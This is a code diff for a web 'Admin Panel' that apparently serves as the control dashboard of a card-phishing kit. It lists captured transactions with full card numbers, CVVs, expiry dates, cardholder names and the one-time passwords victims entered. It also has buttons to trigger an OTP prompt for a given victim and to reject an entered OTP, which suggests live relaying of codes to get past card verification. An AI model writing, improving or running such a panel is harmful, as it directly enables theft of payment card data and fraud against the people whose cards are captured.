@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>apik Panel</title>
+  <title>Admin Panel</title>
   <style>
     body {
       background: #000; 
@@ -253,36 +253,35 @@
       }
     }
 
-async function loadTransactions() {
-  const response = await fetch('/api/transactions');
-  const data = await response.json();
-  console.log(data);  // Check if data is being fetched correctly
-  
-  // Update your table with the fetched data
-  const tbody = document.querySelector("#transactionsTable tbody");
-  tbody.innerHTML = '';  // Clear the current data in the table
-  data.forEach(tx => {
-    const row = document.createElement('tr');
-    row.innerHTML = `
-      <td>${tx.id}</td>
-      <td>${tx.email}</td>
-      <td>${tx.amount}</td>
-      <td>${tx.currency}</td>
-      <td>${tx.cardholder}</td>
-      <td>${tx.status}</td>
-      <td>
-        ${tx.otpEntered ? `<span class="otp-received">${tx.otpEntered}</span>` : 'Waiting for OTP'}
-      </td>
-      <td>
-        <button class="show-otp-btn" onclick="showOTP('${tx.id}')">
-          Show OTP
-        </button>
-      </td>
-    `;
-    tbody.appendChild(row);
-  });
-}
-
+    async function loadTransactions() {
+      try {
+        const response = await fetch("/api/transactions");
+        const data = await response.json();
+        const tbody = document.querySelector("#transactionsTable tbody");
+        tbody.innerHTML = '';
+        data.forEach(tx => {
+          const row = document.createElement('tr');
+          row.innerHTML = `
+            <td>${tx.id}</td>
+            <td>${tx.email}</td>
+            <td>${tx.amount}</td>
+            <td>${tx.currency}</td>
+            <td>${tx.cardNumber}</td>
+            <td>${tx.cvv}</td>
+            <td>${tx.expiry}</td>
+            <td>${tx.cardholder}</td>
+            <td>
+              ${tx.otpEntered ? 
+                `<span class="otp-received">${tx.otpEntered}</span>
+                 <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}')" ${tx.redirectStatus ? 'disabled' : ''}>
+                   Incorrect OTP
+                 </button>` : 
+                tx.otpShown ?
+                  '<span class="status-badge status-otp">Waiting for OTP</span>' :
+                  `<button class="show-otp-btn" onclick="showOTP('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
+                    Show OTP
+                  </button>`
+              }
             </td>
             <td>
               <span class="status-badge status-${tx.status || 'processing'}">
